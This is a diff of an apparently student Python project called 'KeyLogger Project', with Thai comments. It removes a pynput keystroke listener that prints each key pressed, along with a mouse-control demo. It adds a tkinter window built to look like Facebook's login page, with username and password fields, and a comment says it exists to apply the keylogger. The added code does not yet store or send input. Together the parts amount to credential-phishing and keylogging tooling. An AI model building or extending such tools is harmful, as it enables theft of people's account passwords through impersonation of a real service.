@@ -1,87 +1,28 @@
-""" KeyLogger Project Created 19/11/2563 15:41 """
-""" ลง pip และ pynput ด้วย 'pip install pynput' ก่อน """
+""" KeyLogger Project """
+""" เริ่ม 26/11/2563 13:22 """
+""" แก้ไขล่าสุด : Veerawat [26/11/2563 13:22-17:30] """
+""" ref pynput : https://pypi.org/project/pynput/ | ลง pip นี้โดย CMD > pip install pynput ***ต้องมีไฟล์ pynput ก่อน*** """
+""" ref tkinter : https://www.tutorialsteacher.com/python/create-gui-using-tkinter-python """
 
-""" Controlling the mouse """
-def control_mouse_pynput():
-    """ ตรวจจับ Cursor mouse และขยับไปยังตำแหน่งต่างๆ """
-    """ ref: https://pypi.org/project/pynput/ -- Controlling the mouse """
-    from pynput.mouse import Button, Controller
-
-    mouse = Controller()
-
-    # จับตำแหน่งของ Pointer
-    print('The current pointer position is {0}'.format(
-        mouse.position))
-
-    # ตั้งตำแหน่งของ Pointer
-    mouse.position = (10, 20)
-    print('Now we have moved it to {0}'.format(
-        mouse.position))
-
-    # ขยับตำแหน่งของ Pointer
-    mouse.move(5, -5)
-
-    # ควบคุมเมาส์ให้คลิกและปล่อย
-    mouse.press(Button.left)
-    mouse.release(Button.left)
-
-    # สั่งเมาส์ให้ดับเบิ้ลคลิก
-    # twice on macOS
-    mouse.click(Button.left, 2)
-
-    # เลื่อนลูกกลิ้งลง
-    mouse.scroll(0, 2)
-
-""" KeyLogger """
-from pynput import keyboard
-""" Function ของ KeyLogger ทั้งหมด """
-""" ref: https://pypi.org/project/pynput/ -- Monitoring the keyboard """
-def on_press(key):
-    try:
-        print('Alphanumeric Key: {0} pressed'.format(
-            key.char))
-    except AttributeError:
-        print('Special Key: {0} pressed'.format(
-            key))
-
-def on_release(key):
-    print('{0} released'.format(
-        key))
-    if key == keyboard.Key.esc:
-        # หยุดด้วย Key ESC
-        return False
-
-def keylog():
-# ตรวจจับปุ่มกดที่กดและปล่อย
-    with keyboard.Listener(
-            on_press=on_press,
-            on_release=on_release) as listener:
-        listener.join()
-
-    # เริ่ม function
-    listener = keyboard.Listener(
-        on_press=on_press,
-        on_release=on_release)
-    listener.start()
-"""-----------------------------------------------"""
-
-""" Welcome Text """
-def main():
-    """ for show detail of project """
-    print('Welcome to my KeyLogger Project')
-    print('Member: -')
-    print('\t-')
-    print('\t-')
-    print('\t-')
-    print('All Project:')
-    print('\t1. KeyLogger')
-    print('\t2. MouseLogger [Not Available]')
-    print('\t3. MouseControlling')
-    num = input('Press Number: ')
-    if num == '1':
-        keylog()
-    elif num == '2':
-        pass
-    elif num == '3':
-        control_mouse_pynput()
-main()
+""" สร้าง GUI โดย tkinter เพื่อนำ pynput keylogger มาประยุกต์ใช้ """
+import tkinter as tk # import tkinter เพื่อสร้าง GUI
+""" GUI """
+window = tk.Tk() # สร้างตัวแปร
+window.title('Keylogger Project'), window.geometry("800x600") # ชื่อและขนาด GUI
+window.resizable(False, False) # ทำให้เปลี่ยนขนาดจอไม่ได้
+""" ตำแหน่งรูปภาพ """
+bg_image_loc = tk.PhotoImage(file="FacebookBG.png") # ใส่ภาพพื้นหลัง
+""" สร้าง Widget """
+bg_image = tk.Label(window, image=bg_image_loc) # Background บน GUI
+username_box = tk.Entry(window, bd=0, font=('Helvetica', 14)) # Username box บน GUI
+password_box = tk.Entry(window, show='*', bd=0, font=('Helvetica', 14)) # Password box บน GUI
+login_btn = tk.Button(window, text='เข้าสู่ระบบ', bd=0, font=('Helvetica', 14, 'bold'), fg='white', bg='#1877F2', activebackground='#166FE5', activeforeground='white')
+reg_btn = tk.Button(window, text='สร้างบัญชีใหม่', bd=0, font=('Helvetica', 14, 'bold'), fg='white', bg='#42B72A', activebackground='#36A420', activeforeground='white')
+""" วาง Widget """
+bg_image.place(x=0, y=0, relwidth=1, relheight=1) # วาง background บน GUI
+username_box.place(x=465, y=127, width=285, height=40) # วาง Username box บน GUI
+password_box.place(x=465, y=180, width=285, height=40) # วาง Password box บน GUI
+login_btn.place(x=462, y=233, width=290, height=36) # วาง Login button บน GUI
+reg_btn.place(x=547, y=339, width=120, height=36) # วาง Login button บน GUI
+""" loop GUI """
+window.mainloop()
